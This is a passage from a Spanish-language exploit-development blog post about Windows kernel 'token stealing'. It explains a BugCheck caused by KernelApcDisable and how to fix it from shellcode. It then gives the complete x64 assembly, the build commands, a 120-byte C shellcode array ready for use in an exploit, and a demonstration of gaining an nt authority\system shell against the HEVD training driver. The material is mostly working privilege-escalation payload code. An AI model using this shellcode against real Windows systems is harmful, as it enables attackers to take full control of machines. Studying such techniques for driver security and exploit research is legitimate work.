This is a kernel internal error. The most common reason to see this BugCheck is when a filesystem or a driver has a mismatched number of calls to disable and re-enable APCs. The key data item is the Thread->CombinedApcDisable field. This consists of two separate 16-bit fields, the SpecialApcDisable and the KernelApcDisable. A negative value of either indicates that a driver has disabled special or normal APCs (respectively) without re-enabling them; a positive value indicates that a driver has enabled special or normal APCs (respectively) too many times.  
Arguments:
Arg1: 00007ffbd644f8b4, Address of system call function or worker routine
Arg2: 0000000000000000, Thread->ApcStateIndex
Arg3: 000000000000ffff, (Thread->SpecialApcDisable << 16) | Thread->KernelApcDisable
Arg4: ffffdb0487c53b80, Call type (0 - system call, 1 - worker routine)</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/token-stealing/1.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/token-stealing/1.png"></p></div></a>

<p class="plain-text">Accediendo a la estructura <code class="language-plaintext highlighter-rouge">KTHREAD</code> en el offset <code class="language-plaintext highlighter-rouge">0x1e4</code> podemos ver que el valor en ejecución es de <code class="language-plaintext highlighter-rouge">-1</code>, la solución es simplemente limpiar <code class="language-plaintext highlighter-rouge">KernelApcDisable</code> estableciendolo a <code class="language-plaintext highlighter-rouge">0</code> por lo que solo debemos aumentarle su valor en una unidad</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs gs:0x188 L1
002b:00000000`00000188  ffffb081`1abed080

</span><span class="ro">0: kd></span><span class="p"> dt nt!_KTHREAD 0xffffb0811abed080
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x769b263
   +0x028 InitialStack     : 0xffff9084`eab77c90 Void
   +0x030 StackLimit       : 0xffff9084`eab72000 Void
   +0x038 StackBase        : 0xffff9084`eab78000 Void
   ..................................................  
   +0x1e4 KernelApcDisable : 0n-1
   +0x1e6 SpecialApcDisable : 0n0
   +0x1e4 CombinedApcDisable : 0xffff</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces desde nuestro shellcode podemos simplemente obtener el valor actual de <code class="language-plaintext highlighter-rouge">KernelApcDisable</code>, incrementar su valor en una unidad y restaurarlo de nuevo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov</span><span class="mi"> cx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">]</span><span class="c1">            ; $cx = KernelApcDisable  
    </span><span class="o">inc</span><span class="mi"> cx</span><span class="c1">                           ; fix value
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">],</span><span class="mi"> cx</span><span class="c1">            ; restore value</span>
</code></pre></div></div><br>

<p class="plain-text">El shellcode final nos queda de la siguiente forma, resumiendo busca el token del proceso de <code class="language-plaintext highlighter-rouge">SYSTEM</code> para copiarlo al proceso actual y vuelve al modo de usuario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]            </span><span class="c1">; $rax = _EPROCESS
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">rax</span><span class="c1">                     ; $rbx = _EPROCESS

</span><span class="o">    .</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">       ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">0x448               </span><span class="c1">; $rbx = _EPROCESS
        </span><span class="o">cmp</span><span class="no"> qword </span><span class="p">[</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x440</span><span class="p">]</span><span class="p">,</span><span class="mi"> 0x4</span><span class="c1"> ; cmp PID to SYSTEM PID
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                    ; if zf == 0 -> loop

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]           </span><span class="c1">; $rcx = SYSTEM token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0                     </span><span class="c1">; clear _EX_FAST_REF struct
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">           ; store SYSTEM token in _EPROCESS

    </span><span class="o">mov</span><span class="mi"> cx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">]</span><span class="c1">            ; $cx = KernelApcDisable
    </span><span class="o">inc</span><span class="mi"> cx</span><span class="c1">                           ; fix value
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">],</span><span class="mi"> cx</span><span class="c1">            ; restore value  

    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x90</span><span class="p">]</span><span class="c1">            ; $rdx = ETHREAD.TrapFrame
    </span><span class="o">mov</span><span class="mi"> rbp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x158</span><span class="p">]</span><span class="c1">           ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x168</span><span class="p">]</span><span class="c1">           ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="o">mov</span><span class="mi"> r11</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x178</span><span class="p">]</span><span class="c1">           ; $r11 = ETHREAD.TrapFrame.EFlags
    </span><span class="o">mov</span><span class="mi"> rsp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x180</span><span class="p">]</span><span class="c1">           ; $rsp = ETHREAD.TrapFrame.Rsp

    </span><span class="o">xor</span><span class="mi"> eax</span><span class="p">,</span><span class="mi"> eax</span><span class="c1">                     ; $eax = STATUS SUCCESS
    </span><span class="o">swapgs</span><span class="c1">                           ; swap gs segment
    </span><span class="o">o64 sysret</span><span class="c1">                       ; return to usermode</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos compilarlo con <code class="language-plaintext highlighter-rouge">nasm</code> y pasarlo al formato que necesitamos para nuestro exploit, en total nuestro shellcode pesa un total de <code class="language-plaintext highlighter-rouge">120</code> bytes que es bastante bueno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf64 shellcode.asm -o shellcode.o;</span><span class="ve"> ld</span><span class="p"> shellcode.o -m elf_x86_64 -o shellcode

</span><span class="ve">❯ objdump </span><span class="p">-d shellcode | </span><span class="ve">grep</span><span class="am"> '[0-9a-f]:'</span><span class="p"> | </span><span class="ve">grep </span><span class="p">-v</span><span class="am"> 'shellcode' </span><span class="p">| </span><span class="ve">cut </span><span class="p">-f2 -d: | </span><span class="ve">cut</span><span class="p"> -f1-7 -d </span><span class="am">' '</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -s</span><span class="am"> ' '</span><span class="p"> | </span><span class="ve">tr</span><span class="am"> '\t' ' '</span><span class="p"> |</span><span class="ve"> sed</span><span class="am"> 's/ $//g' </span><span class="p">|</span><span class="ve"> sed </span><span class="am">'s/ /, 0x/g'</span><span class="p"> | </span><span class="ve">paste</span><span class="p"> -d </span><span class="am">'' </span><span class="p">-s |</span><span class="ve"> sed </span><span class="am">'s/^, //g'</span><span class="p">
0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x82, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x48, 0x8b, 0x9b, 0x48, 0x04, 0x00, 0x00, 0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00, 0x48, 0x83, 0xbb, 0x40, 0x04, 0x00, 0x00, 0x04, 0x75, 0xe8, 0x48, 0x8b, 0x8b, 0xb8, 0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00, 0x66, 0x8b, 0x8a, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x8a, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x92, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="usage">
<br><h3 class="post-title">Usage</h3><br>

<p class="plain-text">Su uso en un <code class="language-plaintext highlighter-rouge">exploit</code> real inicia por definir el shellcode como un array de <code class="language-plaintext highlighter-rouge">bytes</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">BYTE</span><span class="p"> tokenStealing[</span><span class="mi">120</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="c1">                                     // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS  
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov cx, [rdx + 0x1e4]            ; $cx = KernelApcDisable
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="c1">                                     // inc cx                           ; fix value
    </span><span class="mi">0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rdx + 0x1e4], cx            ; restore value
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rdx, [rdx + 0x90]            ; $rdx = ETHREAD.TrapFrame
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rbp, [rdx + 0x158]           ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rdx + 0x168]           ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="mi">0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov r11, [rdx + 0x178]           ; $r11 = ETHREAD.TrapFrame.EFlags
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rsp, [rdx + 0x180]           ; $rsp = ETHREAD.TrapFrame.Rsp
    </span><span class="mi">0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="c1">                                           // xor eax, eax                     ; $eax = STATUS SUCCESS
    </span><span class="mi">0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="c1">                                     // swapgs                           ; swap gs segment
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07</span><span class="c1">                                      // o64 sysret                       ; return to usermode
</span><span class="p">};</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de explotar la vulnerabilidad y hacer que se ejecute el <code class="language-plaintext highlighter-rouge">shellcode</code> habremos modificado el token del proceso actual por el de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, asi que al lanzar una <code class="language-plaintext highlighter-rouge">cmd.exe</code> conseguimos obtener una shell con privilegios máximos sobre el equipo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">    system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);  </span>
</code></pre></div></div><br>

<p class="plain-text">Un ejemplo puede ser el siguiente <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/HEVD/StackOverflow_SMEP.c">exploit</a> de <code class="language-plaintext highlighter-rouge">HEVD</code> donde con el <code class="language-plaintext highlighter-rouge">token stealing</code> logramos robar el token y luego lanzamos una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
